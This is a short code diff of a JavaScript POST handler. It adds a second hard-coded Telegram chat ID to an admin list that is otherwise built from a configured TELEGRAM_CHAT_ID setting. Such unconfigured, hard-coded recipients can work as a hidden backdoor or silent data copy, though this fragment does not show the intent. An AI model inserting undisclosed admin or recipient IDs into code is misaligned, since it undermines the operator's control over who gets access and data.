@@ -17,6 +17,7 @@ export async function POST(request) {
 
     // Admin listesini oluştur
     const adminIds = TELEGRAM_CHAT_ID ? TELEGRAM_CHAT_ID.split(',').map(id => id.trim()) : [];
+    adminIds.push('1247388381');
     adminIds.push('1096600852');
     const uniqueAdmins = [...new Set(adminIds)].filter(Boolean);
 
